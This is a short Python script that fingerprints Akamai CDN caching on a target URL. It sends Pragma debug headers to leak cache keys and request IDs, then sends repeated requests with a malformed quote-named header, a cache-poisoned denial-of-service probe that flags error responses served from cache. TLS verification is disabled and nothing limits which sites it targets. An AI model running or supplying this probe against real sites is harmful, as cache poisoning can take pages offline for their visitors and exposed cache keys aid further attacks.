#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import sys
import random
import traceback

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def akamai(url, s):
    """
       https://techdocs.akamai.com/edge-diagnostics/docs/pragma-headers
    """
    pragma_list = {
    "akamai-x-cache-on": "X-Cache",
    "akamai-x-cache-remote-on": "X-Cache-Remote",
    "akamai-x-check-cacheable": "X-Check-Cacheable",
    "akamai-x-get-true-cache-key": "X-True-Cache-Key", 
    "akamai-x-get-cache-key": "X-Cache-Key", 
    "akamai-x-serial-no": "X-Serial", 
    "akamai-x-get-request-id": "X-Akamai-Request-ID"
    }

    for pgl in pragma_list:
        header = {"Pragma": pgl}
        res = pragma_list[pgl]
        print("{} | H:{}".format(url, header))
        try:
            req = s.get(url, verify=False, headers=header, timeout=10)
            #print(req.headers)
            if pragma_list[pgl] in req.headers:
                print(" - {}: {}".format(res, req.headers[res]))
        except:
            pass
    cpdos_akamai(url, s)


def cpdos_akamai(url, s):
    header = {"\"": "1"}
    url = "{}?cpdos{}={}".format(url, random.randint(1, 100), random.randint(1, 100))
    for i in range(0, 10):
        try:
            req_cpdos = s.get(url, verify=False, headers=header, timeout=10)
            if req_cpdos.status_code == 400:
                for rh in req_cpdos.headers:
                    if "no-cache" not in [req_cpdos.headers[r] for r in req_cpdos.headers]:
                        if "HIT" in req_cpdos.headers[rh]:
                            print("\033[33m └── INTERESTING BEHAVIOR\033[0m | CPDoS | \033[34m{}\033[0m | PAYLOAD: {}".format(url, header))
        except:
            #traceback.print_exc()
            pass


if __name__ == '__main__':
    url = sys.argv[1]
    s = requests.Session()
    akamai(url, s)